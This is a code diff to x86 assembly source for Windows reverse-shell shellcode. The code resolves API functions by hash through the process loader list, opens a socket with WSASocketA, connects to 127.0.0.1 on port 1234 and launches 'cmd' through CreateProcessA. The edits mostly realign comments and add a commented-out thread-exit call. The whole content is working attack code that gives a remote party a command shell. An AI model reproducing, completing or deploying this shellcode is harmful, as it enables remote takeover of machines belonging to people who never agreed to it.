@@ -49,16 +49,17 @@ endstruc
       xor    eax, eax
       call   init_api_disp  ; load the API dispatcher
 api_hash:      
-      dd     0xDF6D65D1     ; WS2_32.dll + WSASocketA    
+      dd     0xDF6D65D1     ; WS2_32.dll   + WSASocketA    
       db     'cmd',0h    
       dd     0D2040002h     ; sa.sin_port = htons(1234)
       dd     00100007Fh     ; sa.sin_addr = inet_addr("127.0.0.1")
-      dd     0xA324AC0C     ; WS2_32.dll + connect
+      dd     0xA324AC0C     ; WS2_32.dll   + connect
       dd     0x611AD39B     ; KERNEL32.dll + CreateProcessA
       dd     0x607F058C     ; KERNEL32.dll + WaitForSingleObject
+      ;dd     0x467EDD8B     ; ntdll.dll    + RtlExitUserThread
 api_disp: 
-      lodsd                     ; eax = hash to find
-      pushad                    ; saves api hash on stack
+      lodsd                 ; eax = hash to find
+      pushad                ; saves api hash on stack
       xor    eax, eax
       mov    eax, [fs:eax+30h]  ; eax = (PPEB) __readfsdword(0x30);
       mov    eax, [eax+0ch] ; eax = (PPEB_LDR_DATA)peb->Ldr
@@ -67,7 +68,7 @@ api_disp:
 next_dll:    
       mov    edi, [edi]     ; edi = dte->InLoadOrderLinks.Flink
 get_dll:
-      mov    ebx, [edi+18h]     ; ebx = dte->DllBase
+      mov    ebx, [edi+18h] ; ebx = dte->DllBase
       ; eax = IMAGE_DOS_HEADER.e_lfanew
       mov    eax, [ebx+3ch]
       ; ecx = IMAGE_DATA_DIRECTORY.VirtualAddress
@@ -179,4 +180,5 @@ init_api_disp:
       push   dword [edi]
       call   ebp   
       
-      ; crash...
+      ; RtlExitUserThread();
+      ; call   ebp
